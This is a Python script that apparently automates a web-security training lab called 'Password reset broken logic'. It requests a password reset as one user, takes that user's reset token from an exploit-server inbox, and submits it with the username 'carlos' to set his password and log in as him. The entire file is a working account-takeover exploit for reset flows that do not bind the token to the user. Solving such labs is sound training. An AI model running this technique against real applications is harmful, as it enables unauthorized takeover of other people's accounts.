import requests
import re
from colorama import Fore

LAB_NAME = "Password reset broken logic"
NEW_CARLOS_PASSWORD = "mystic_mido"

def run(url, payload=None, proxies=None):
    url = url.rstrip('/')
    
    exploit_input = input(Fore.YELLOW + "[?] Enter your Exploit Server URL: " + Fore.WHITE).strip()
    # Remove /email if the user includes it accidentally
    if exploit_input.endswith("/email"):
        exploit_url = exploit_input[:exploit_input.rfind("/email")]
    else:
        exploit_url = exploit_input.rstrip('/')

    print(Fore.WHITE + "[1] Sending forgot-password request as wiener...")
    try:
        requests.post(
            f"{url}/forgot-password",
            data={"username": "wiener"},
            proxies=proxies,
            verify=False,
            allow_redirects=False
        )
    except Exception as e:
        print(Fore.RED + f"[!] Error sending forgot-password request: {e}")
        return False

    print(Fore.WHITE + "[2] Extracting token from email client...")
    try:
        resp = requests.get(f"{exploit_url}/email", proxies=proxies, verify=False, allow_redirects=False)
        token = re.search(r'temp-forgot-password-token=([a-zA-Z0-9]+)', resp.text).group(1)
        print(Fore.GREEN + f"[+] Token captured: {token}")
    except Exception as e:
        print(Fore.RED + f"[!] Failed to extract token: {e}")
        return False

    print(Fore.WHITE + "[3] Resetting password for carlos...")
    try:
        reset_data = {
            "temp-forgot-password-token": token,
            "username": "carlos",
            "new-password-1": NEW_CARLOS_PASSWORD,
            "new-password-2": NEW_CARLOS_PASSWORD
        }
        reset_resp = requests.post(
            f"{url}/forgot-password",
            data=reset_data,
            proxies=proxies,
            verify=False,
            allow_redirects=False
        )

        if reset_resp.status_code != 302:
            print(Fore.RED + "[!] Password reset may have failed (no redirect).")
            print(Fore.YELLOW + f"[!] Response code: {reset_resp.status_code}, body: {reset_resp.text[:200]}")
            return False
    except Exception as e:
        print(Fore.RED + f"[!] Error during password reset: {e}")
        return False

    print(Fore.GREEN + "[+] Password reset sent. Logging in as carlos...")

    try:
        login_resp = requests.post(
            f"{url}/login",
            data={"username": "carlos", "password": NEW_CARLOS_PASSWORD},
            proxies=proxies,
            verify=False
        )

        if "Your username is: carlos" in login_resp.text:
            print(Fore.GREEN + "Logged in successfully as carlos!")
            return True
        else:
            print(Fore.RED + "Login failed. Check credentials or response.")
            return False
    except Exception as e:
        print(Fore.RED + f"[!] Error during login: {e}")
        return False
